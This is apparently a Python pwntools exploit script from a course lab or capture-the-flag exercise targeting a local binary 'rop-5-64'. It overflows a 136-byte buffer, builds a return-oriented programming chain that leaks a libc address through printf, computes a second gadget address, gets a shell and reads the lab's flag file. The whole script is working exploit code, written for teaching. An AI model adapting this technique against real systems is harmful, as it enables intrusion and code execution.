from pwn import *

p = process("./rop-5-64")

poprdi = p64(0x0000000000400763) #: pop rdi ; ret
poprdx = p64(0x0000000000400688) #: pop rdx ; nop ; pop rbp ; ret
poprsi = p64(0x0000000000400761) #: pop rsi ; pop r15 ; ret

strcpy = p64(0x0000000000400641)
read = p64(0x601018)
printf = p64(0x4004e0)
bssaddr = 0x0000000000601050

ins = p64(0x00000000004006cd)
per = p64(0x6007a2)
nl = p64(0x6007a5)
s = p64(0x600395)
zero = p64(0x600395)

def copy(index, char):
    return poprdi + p64(bssaddr+index) + poprsi + char * 2 + strcpy

payload = "A"*136
payload += copy(0, nl)
payload += copy(1, nl)
payload += copy(2, per)
payload += copy(3, s)
payload += copy(4, nl)

payload += poprdi + p64(bssaddr) + poprsi + read*2 + printf + ins
with open("x", "w") as x:
    x.write(payload)

p.recv(timeout = 1)
p.send(payload)
x = p.recvline(timeout = 1)
x = p.recvline(timeout = 1)
x = p.recvline(timeout = 1)
x = str(p.recvline(timeout = 1))
x = x[:-1]
x += "\x00"*2
x = p64(u64(x) + 0x5d530)
payload2 = "A"*136 + poprdi + p64(0x600252) + poprsi + p64(0)*2 + poprdx + p64(0)*2 + x +  p64(0x00000000004006cd)
print hex(u64(x))
p.sendline(payload2)
p.recv(timeout=1)
p.sendline("cat /home/labs/week5/rop-5-64/flag")
print p.recv(timeout =50)
print p.recv(timeout =50)
